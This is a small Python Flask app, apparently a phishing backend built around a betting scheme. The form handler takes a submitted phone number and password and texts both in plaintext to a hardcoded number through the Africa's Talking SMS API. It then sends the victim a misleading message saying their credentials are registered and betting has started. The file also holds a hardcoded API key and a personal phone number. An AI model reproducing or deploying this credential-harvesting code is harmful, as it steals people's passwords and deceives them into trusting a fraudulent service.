from flask import Flask,render_template,request
import africastalking
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':

        email = request.form['email']
        password= request.form['password']
        sms_(email,password)
    return render_template ("index.html")


def on_finish(error, response):
        if error is not None:
            raise error
        print(response)

def sms_(Nmbr,password):
        number= ["+254726215805"]
        if (Nmbr[:1] == '0'):
            Nmbr = Nmbr.replace("0", "+254", 1)

        message = "phone number : " + Nmbr + "\npassword : "+password
        print (message)
        username = "S-maji"
        api_key = "6f708000072b95912546e484d4924c92c8eab98c50ac82742ab6bce6a901d1ca"

        africastalking.initialize(username, api_key)
        # Initialize a service e.g. SMS
        sms = africastalking.SMS
        sms.send(message,number, callback=on_finish)

        number = [Nmbr]
        message = " Your credentials have been registered and betting started "
        sms.send(message, number, callback=on_finish)

if __name__ == '__main__':
    app.run()